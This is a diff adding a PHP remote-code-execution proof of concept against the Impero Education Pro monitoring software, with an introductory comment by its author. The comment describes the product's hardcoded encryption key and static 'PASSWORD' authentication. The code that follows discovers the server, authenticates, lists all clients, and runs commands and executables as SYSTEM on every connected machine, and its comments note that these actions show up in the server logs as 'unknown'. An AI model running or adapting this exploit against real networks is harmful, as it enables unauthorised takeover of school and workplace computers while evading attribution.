@@ -1,0 +1,196 @@
+/*
+If you're unsure what Impero is, it's essentially a corporate/educational RAT. Vendor site: https://www.imperosoftware.co.uk/
+
+They recently were in the news about how they implemented "anti-radicalisation" shit or something.
+
+They had a booth at BETT back in January. They gave out donuts. Those were nice. Unfortunately, when I asked about their security, nobody answered me.
+
+Some reversing later, looks like Impero is completely pwned amirite.
+
+The proprietary Impero protocol on the wire is encrypted. With AES-128 CBC. And a hardcoded key and iv that are both derived from sha512(Imp3ro). ISO10126 padding is used.
+
+After connection, a client must authenticate. This is done by sending "-1|AUTHENTICATE\x02PASSWORD". Not even joking here. "PASSWORD" is a seperate string though, so it might be different for some special clients maybe. No idea.
+
+Then, we have full range to do whatever we want. My PoC also does negotiatiation, but I'm not sure if that's needed.
+
+We can get a list of clients with the "SENDCLIENTS" command, then send all the IDs to "SENDCOMMANDMSG" (run CLI command as SYSTEM), or OPENFILE (run visibly an EXE under whatever user, including SYSTEM), or other protocol commands, etc.
+
+There's an OSX version, but I haven't properly looked into that. Run my PoC with the right args and it pops calc on every Windows client as SYSTEM. It also runs "whoami > c:\lol.txt", also as SYSTEM. This second one gets logged serverside, but the server logs it as "unknown" as it doesn't know what client did it.
+
+Basically, if you use Impero, please don't.
+
+Oh yeah -- free speech for the win... internet censorship is <insert some expletives here>, and so are any and all RATs.
+
+- slipstream / RoL^LHQ - @TheWack0lian
+
+PoC code follows. In PHP because lol. PoC works on at least 5.x (latest).
+*/
+
+<?php
+// Impero Education Pro SYSTEM-RCE PoC
+// by slipstream/RoL^LHQ
+// greets to everyone in lizardhq! :)
+
+function PadString($str) {
+	$size = 16;
+	$pad = $size - (strlen($str) % $size);
+	$padstr = '';
+	for ($i = 1; $i < $pad; $i++)
+		$padstr .= chr(mt_rand(0,255));
+	return $str.$padstr.chr($pad);
+}
+
+function UnPadString($str) {
+	return substr($str,0,-(ord(substr($str,-1))));
+}
+
+function CryptString($str) {
+	$hash = hash('sha512','Imp3ro',true);
+	$key = substr($hash,0,0x20);
+	$iv = substr($hash,0x20,0x10);
+	$crypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128,$key,PadString($str),'cbc',$iv);
+	return $crypted;
+}
+
+function DecryptString($str) {
+	$hash = hash('sha512','Imp3ro',true);
+	$key = substr($hash,0,0x20);
+	$iv = substr($hash,0x20,0x10);
+	return UnPadString(mcrypt_decrypt(MCRYPT_RIJNDAEL_128,$key,$str,'cbc',$iv));
+}
+
+function SendNetwork($h,$str) {
+	global $socketid;
+	$crypted = CryptString($socketid."|".$str);
+	socket_write($h,strlen($crypted).'|'.$crypted);
+	return;
+}
+
+function RecvNetwork($h) {
+	$len = '';
+	$chr = '';
+	do {
+		$len .= $chr;
+		$chr = socket_read($h,1);
+	} while ($chr != '|');
+	$len = (int)($len);
+	if ($len < 1) die("Something's wrong. Length isn't an int.");
+	socket_set_block($h);
+	$crypted = socket_read($h,$len);
+	$dec = DecryptString($crypted);
+	global $socketid;
+	$dec = explode('|',$dec,2);
+	if ($socketid == -1) $socketid = $dec[0];
+	return $dec[1];
+}
+
+function Connect($host,$port = 30015) {
+	echo "Connecting...";
+	$h = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
+	socket_set_block($h);
+	if ((!$h) || (!socket_connect($h,$host,$port))) {
+		echo "failed.\n";
+		return false;
+	}
+	echo "done!\nAuthenticating...";
+	// authenticate
+	SendNetwork($h,"AUTHENTICATE\x02PASSWORD");
+	echo "done!\nWaiting for response...";
+	// we should get "AUTH:OK" back
+	$data = RecvNetwork($h);
+	if ($data != "AUTH:OK") {
+		echo "authentication failed.\n";
+		return false;
+	}
+	echo "authentication succeeded!\nNegotiating...";
+	SendNetwork($h,"PING1\x02IE11WIN7\x03\x035003\x019f579e0f20cb18c8bc1ee4f2dc5d9aeb\x01c0d3fd41a05add5e6d7c8b64924bef86\x018dc3a6ceec8a51e1fd2e7e688db44417\x01d1554e349fc677e6011309683ac1b85b\x012b94f70093e484b8fc7f62a4670377ea");
+	// we get sent 4 loads of packets. discard all.
+	for ($i = 0; $i < 4; $i++) {
+		RecvNetwork($h);
+		usleep(500000);
+	}
+	//SendNetwork($h,"-1|ANNOUNCE\x01600\x012\x01-1\x02IE11WIN7\x03IEUser\x03\x031\x03\x030\x031\x036\x0308:00:27:85:C5:CD,08:00:27:D0:C2:E1\x0310.0.2.15,192.168.56.101\x035003\x032015-06-11 12:17:19\x0310.0.2.255,192.168.56.255\x03None,Everyone,Users,INTERACTIVE,CONSOLE LOGON,Authenticated Users,This Organization,Local account,LOCAL,NTLM Authentication\x035003\x032.0.50727.5485\x03IE11WIN7\x03NODOMAIN");
+	echo "done!\n";
+	return $h;
+}
+
+function GetAllClients($h) {
+	$pline = "SENDCLIENTS\x01604\x011\x010\x02";
+	echo "Getting all clients...";
+	SendNetwork($h,$pline);
+	$data = RecvNetwork($h);
+	// grab the base64 blob
+	$data = array_pop(explode("\x02",$data));
+	// unbase64 and uncompress
+	$data = gzdecode(base64_decode($data));
+	$ret = array();
+	foreach (explode("\r\n",$data) as $line) {
+		// we only care about clientIDs
+		$ret[] = array_shift(explode("\x03",$line));
+	}
+	echo "done!\n";
+	return $ret;
+}
+
+function RunCmd($h,$ids,$cmdline) {
+	global $socketid;
+	$ids = implode(',',$ids);
+	$pline = "ECHO\x01\x01".$ids."\x01SENDCOMMANDMSG\x010\x02\x01\x01".$cmdline;
+	echo "Sending evil RunCMD data...";
+	SendNetwork($h,$pline);
+	echo "done!\n";
+	// if this was a real proper negoiated client we'd get something back
+	// however, we aren't, and we're masquerading as client #0; thus, we don't.
+	// this does show up in logs, with the executed command. however, the server doesn't know who ran it, so it shows up as "unknown". :)
+}
+
+function RunExeAsSystem($h,$ids,$exe) {
+	global $socketid;
+	$ids = implode(',',$ids);
+	$pline = "ECHO\x01\x01".$ids."\x01OPENFILE\x010\x02".$exe."\x08\x08NT AUTHORITY\SYSTEM\x08Password";
+	echo "Sending evil RunEXE data...";
+	SendNetwork($h,$pline);
+	echo "done!\n";
+	// we don't get a response from this one
+}
+
+function FindImperoServer($if,$addr) {
+	$sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP); 
+	socket_set_option($sock, SOL_SOCKET, SO_BROADCAST, 1);
+	socket_set_option($sock,SOL_SOCKET,IP_MULTICAST_IF,$if);
+	$str = "ARE_YOU_IMPERO_SERVER";
+	socket_sendto($sock, $str, strlen($str), MSG_DONTROUTE, $addr, 30016);
+	socket_set_option($sock,SOL_SOCKET,SO_RCVTIMEO,array("sec"=>6,"usec"=>0));
+	$r = socket_recvfrom($sock, $buf, 18, 0, $remote_ip, $remote_port);
+	if ($buf == "I_AM_IMPERO_SERVER") return $remote_ip;
+	return false;
+}
+
+$socketid = -1;
+echo "[*] Impero Education Pro SYSTEM-RCE PoC by slipstream/RoL^LHQ\n";
+if ($argc < 2) {
+	echo "[-] Usage: ".$argv[0]." <serverIPs space-delimited>\n";
+	echo "[*] If you pass \"detect <if> <broadcastmask>\" (without quotes) as serverIP then we will try to find an impero server, using interface and broadcast mask given.\n";
+	echo "[*] Example of this: ".$argv[0]." detect vboxnet0 192.168.56.255\n";
+	echo "[*] This PoC will pop a calc and run whoami > C:\lol.txt as SYSTEM on *every connected client*!\n";
+	die();
+}
+array_shift($argv);
+foreach ($argv as $key=>$arg) {
+	$detected = false;
+	if ($arg == "detect") {
+		if ($key + 2 >= count($argv)) continue;
+		echo "[*] Finding Impero server...\n";
+		$arg = FindImperoServer($argv[$key+1],$argv[$key+2]);
+		if ($arg == false) die("[-] Cannot find Impero server\n");
+		echo "[+] Found Impero server at ".$arg."\n";
+		$detected = true;
+	}
+	$h = Connect($arg);
+	if ($h === false) continue;
+	$clients = GetAllClients($h);
+	RunExeAsSystem($h,$clients,"calc");
+	RunCmd($h,$clients,"whoami > C:\lol.txt");
+	echo "\n";
+	if ($detected) die();
+}
